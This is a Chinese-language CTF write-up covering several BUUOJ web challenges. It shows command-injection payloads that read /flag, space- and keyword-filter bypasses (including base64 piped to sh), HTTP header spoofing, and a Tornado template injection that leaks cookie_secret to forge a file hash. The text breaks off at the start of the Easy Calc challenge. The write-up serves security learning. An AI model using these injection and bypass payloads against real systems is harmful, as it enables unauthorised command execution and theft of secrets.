## **9.[ACTF2020 新生赛]Exec**
访问url：
首页如下：
直接ping ip可以得到结果
常见管道符
1、|（就是按位或），直接执行|后面的语句
127.0.0.1 | cat /flag
得到flag{546c33d7-aa0d-4a05-90b6-33adbd281b2b}
2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
abc || cat /flag
结果如下：
3、&（就是按位与），&前面和后面命令都要执行，无论前面真假
127.0.0.1 & cat /flag
结果如下：
4、&&（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令
ping 127.0.0.1 && whoami
这里没试出来flag，用cmd试一下：
5、;（linux下有的，和&一样的作用）
127.0.0.1 ; cat /flag
结果如下：
## **10.[GXYCTF2019]Ping Ping Ping**
访问url：
首页如下：
打开链接，页面提示/?ip=
猜测本题的意思是让我们把这个当做变量上传参数。
先输入127.0.0.1
看来把我们上传的东西当做ip来执行ping操作。
构造payload：?ip=127.0.0.1;ls
出现了flag.php，那么简单的？
cat flag.php走起
?ip=127.0.0.1;cat flag.php
可以看到有过滤空格
过滤空格的解决办法如下
    $IFS
    ${IFS}
    $IFS$1 //$1改成$加其他数字貌似都行
    {cat,flag.php}  //用逗号实现了空格功能
    %20 
    %09
试试：?ip=127.0.0.1|cat$IFS$1flag.php
有过滤flag字样的，那先看看index.php，看看过滤规则。
?ip=127.0.0.1;cat$IFS$1index.php
    /?ip=
    PING 127.0.0.1 (127.0.0.1): 56 data bytes
    /?ip=
    |\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
        echo preg_match("/\&|\/|\?|\*|\|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
        die("fxck your symbol!");
      } else if(preg_match("/ /", $ip)){
        die("fxck your space!");
      } else if(preg_match("/bash/", $ip)){
        die("fxck your bash!");
      } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
        die("fxck your flag!");
      }
      $a = shell_exec("ping -c 4 ".$ip);
      echo "
    ";
      print_r($a);
    }
    ?>
解决办法
1)$a变量可以覆盖
构造?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
查看一下源码，看到flag{9c0ba8cc-cc60-43d2-8b87-e964e62fb538}
2)利用
    ?ip=127.0.0.1;cat$IFS$9`ls`
将ls的结果当成cat的参数，那样就不用出现flag这个参数了。
结果也是在源码中。
3)利用sh，bash下编码
    ?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
4)利用内联执行：
    ?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php
## **11.[极客大挑战 2019]Knife**
访问url：
首页如下：
给出的提示使用菜刀连接，密码为Syc
拿到flag{749bca20-c6f1-44b0-b941-7d4f062e8323}
或者在虚拟终端cat一下flag
## **12.[极客大挑战 2019]Http**
访问url：
首页如下：
先查看源代码，找到Secret.php
找到Secret.php文件，进入相应的页面
提示我们需要修改header头，把
Referer:
请求包如下：
    GET /Secret.php HTTP/1.1
    Host: node3.buuoj.cn:25490
    Cache-Control: max-age=0
    DNT: 1
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: https://www.Sycsecret.com
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: session=c27a6db5-6635-4b96-9841-7e4d9fc76f0f.1itv3m9hNcEaFGPQCqcic-ppGHE
    Connection: close
响应如下：
随后提示我们浏览器需要使用Syclover，向头里面添加一行，也就是修改一下User-Agent的内容
User-Agent:Syclover
请求包如下：
    GET /Secret.php HTTP/1.1
    Host: node3.buuoj.cn:25490
    Cache-Control: max-age=0
    DNT: 1
    Upgrade-Insecure-Requests: 1
    User-Agent: Syclover
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: https://www.Sycsecret.com
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: session=c27a6db5-6635-4b96-9841-7e4d9fc76f0f.1itv3m9hNcEaFGPQCqcic-ppGHE
    Connection: close
响应如下：
发现到现在还是没有出来，它说我们只能在本地访问，那么意思就是要我们使用127.0.0.1来访问，那么我们来添加一行
X-Forwarded-For: 127.0.0.1
请求包如下：
    GET /Secret.php HTTP/1.1
    Host: node3.buuoj.cn:25490
    Cache-Control: max-age=0
    DNT: 1
    Upgrade-Insecure-Requests: 1
    User-Agent: Syclover
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: https://www.Sycsecret.com
    X-Forwarded-For: 127.0.0.1
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: session=c27a6db5-6635-4b96-9841-7e4d9fc76f0f.1itv3m9hNcEaFGPQCqcic-ppGHE
    Connection: close
得到flag{cb30a0b2-0822-43a2-8964-b55bffa0afe6}
## **13.[护网杯 2018]easy_tornado**
访问url：
打开页面发现三个链接依次打开
发现各自的文本
    flag in /fllllllllllllag
    render
    md5(cookie_secret+md5(filename))
从上面三个信息我们的值flag在/fllllllllllllag文件，render是模板注入，经过测试发现过滤了
    payload:
    http://27144826-6551-4fbe-8d5a-348db2ffd239.node3.buuoj.cn/error?msg={{1*2}}
如下：
render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用
Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python
的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。
然后就是这段代码md5(cookie_secret+md5(filename))
我们根据之前打开文件的url参数分析这个就是filehash的值，想获得flag只要我们在url中传入/fllllllllllllag文件和filehash
经过这段代码处理的值即可关键就在cookie_secret，我们得想办法获得cookie_secret
在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler
指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量
通过模板注入方式我们可以构造
    payload:
    http://27144826-6551-4fbe-8d5a-348db2ffd239.node3.buuoj.cn/error?msg={{handler.settings}}
成功拿到40ab5ed8-4c6f-4e2f-b92e-1fda29e82f4d
根据获得的cookie_secret构造md5(cookie_secret+md5(filename))这样的py或者手动cmd5去加密
python3版本
    import hashlib
    hash = hashlib.md5()
    filename='/fllllllllllllag'
    cookie_secret="40ab5ed8-4c6f-4e2f-b92e-1fda29e82f4d"
    hash.update(filename.encode('utf-8'))
    s1=hash.hexdigest()
    hash = hashlib.md5()
    hash.update((cookie_secret+s1).encode('utf-8'))
    print(hash.hexdigest())
python2.7版本
    #!-*-coding:utf-8 -*-    import hashlib
    def md5(s):
        md5 = hashlib.md5()
        md5.update(s)
        print(md5.hexdigest())
        return md5.hexdigest()
    def filehash():
        filename = '/fllllllllllllag'
        cookie_secret = '40ab5ed8-4c6f-4e2f-b92e-1fda29e82f4d'
        print(cookie_secret + md5(filename))
        print(md5(cookie_secret + md5(filename)))
    if __name__ == '__main__':
        filehash()
得到加密后的结果0e68f61488cca5aad0677cad0f8b8e8e
filename拼接我们的flag文件/fllllllllllllag将加密的结果拼接在filehash的后面得到最终payload:
[http://27144826-6551-4fbe-8d5a-348db2ffd239.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=0e68f61488cca5aad0677cad0f8b8e8e](http://27144826-6551-4fbe-8d5a-348db2ffd239.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=0e68f61488cca5aad0677cad0f8b8e8e)
得到flag{44570899-653f-48eb-be17-2f57febc0580}
## **14.[RoarCTF 2019]Easy Calc**
访问url：
首页如下一个计算界面：
查看页面源代码
可以看见有个url提示